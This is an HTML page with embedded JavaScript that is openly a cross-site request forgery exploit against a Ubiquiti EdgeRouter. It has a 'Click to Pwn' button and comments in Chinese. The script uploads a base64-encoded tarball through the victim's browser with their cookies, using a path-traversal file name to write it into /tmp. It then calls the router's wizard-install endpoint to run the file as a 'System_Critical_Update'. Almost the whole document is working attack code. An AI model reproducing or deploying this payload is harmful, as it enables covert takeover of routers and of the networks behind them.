<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="referrer" content="no-referrer">
    <title>Router CSRF Exploit</title>
</head>
<body>
    <h1>Ubiquiti EdgeRouter CSRF Exploit (Blind Mode)</h1>
    <button onclick="runExploit()">Click to Pwn</button>
    <div id="log" style="white-space: pre-wrap; font-family: monospace;"></div>

    <script>
        var target = "https://192.168.1.1";
        // 强行指定一个固定的绝对路径，利用路径穿越
        // 如果路由器过滤了 ../，你需要根据实际情况调整这里
        var fixedPath = "../../tmp/exploit.tar.gz"; 

        function log(msg) {
            document.getElementById("log").innerText += "\n" + msg;
            console.log(msg);
        }

        function runExploit() {
            // 1. 准备 Payload (保持你原来的 Base64)
            var b64Data = "H4sICCx1MmkC/2V4cGxvaXQudGFyAO3VQU/CMBjG8Z75FDWeXft23ZolaDyIgYNICIlHUrclm7LNjIJE43eX6UGjAU/MAM/v0qVb0kvf/T3hicuRXfVTm6Q12wn5adMqpa++npt9kook4yvWgsXc2Xp9PDtOKuSFy4v0nEyoI9LahF7kBxR1GByB5/zF1slZvSh3d0Yz1KHWzUomkN/XD0SaUUDN5VM6CNbzr8gnxmWb8x/bWbXt//fX+z11eiLu81LMs46rFnHGhSuexOhu2LuaXo9vb6aD4aQ3HvYmnTgrqoQbYzZ/gmnaPx76j/6j/0fefy9zxezf+i/9X/1Xxkf/29DN6KJv48c04cvc8kHp0rpMXVes9zEd6D/6j/7D4VraWZ5YV9Xew7wqdzf/W/sv1c/+m1Ci/214fcMMAAAAAAAAAAAcsncEDx/KACgAAA==";
            var byteCharacters = atob(b64Data);
            var byteNumbers = new Array(byteCharacters.length);
            for (var i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            var blob = new Blob([new Uint8Array(byteNumbers)], { type: "application/x-gzip" });

            // 2. 发送 Step 1: 上传文件
            var formData = new FormData();
            // 关键：文件名带路径穿越，强行写入 /tmp/
            formData.append("qqfile", blob, fixedPath);

            var xhr = new XMLHttpRequest();
            xhr.open("POST", target + "/api/wizard/upload.json", true);
            xhr.withCredentials = true; // 必带 Cookie

            log("[*] Step 1: Blind Uploading to fixed path: " + fixedPath + " ...");

            xhr.onload = function () {
                // 只要状态码不是 0，说明请求发到了（哪怕是 200 我们也读不到内容，因为 CORS）
                log("[?] Step 1 finished (Status: " + xhr.status + "). Assuming success.");
                log("[*] Waiting 2 seconds for file system I/O...");
                // 盲打核心：不看结果，直接延时执行下一步
                setTimeout(triggerInstall, 2000);
            };

            xhr.onerror = function () {
                // 即使报错，有时候请求也发出去了，继续尝试下一步
                log("[!] Network Error (CORS blocked reading?), proceeding anyway...");
                setTimeout(triggerInstall, 2000);
            };

            xhr.send(formData);
        }

        function triggerInstall() {
            log("[*] Step 2: Sending Install Command pointing to /tmp/exploit.tar.gz ...");
            
            var xhr2 = new XMLHttpRequest();
            xhr2.open("POST", target + "/api/wizard/create.json", true);
            xhr2.withCredentials = true;

            var formData2 = new FormData();
            formData2.append("name", "System_Critical_Update");
            // 这里使用我们刚才强行指定的路径（去掉 ../，因为路由器内部可能已经存到了 /tmp）
            // 注意：这里需要你根据路由器的实际文件系统调整。
            // 如果上传时用 ../../tmp/exploit.tar.gz，通常存下来就是 /tmp/exploit.tar.gz
            formData2.append("path", "/tmp/exploit.tar.gz");

            xhr2.onload = function () {
                log("[+] Step 2 Sent. Check Router SSH for success!");
            };
            
            xhr2.send(formData2);
        }
    </script>
</body>
</html>
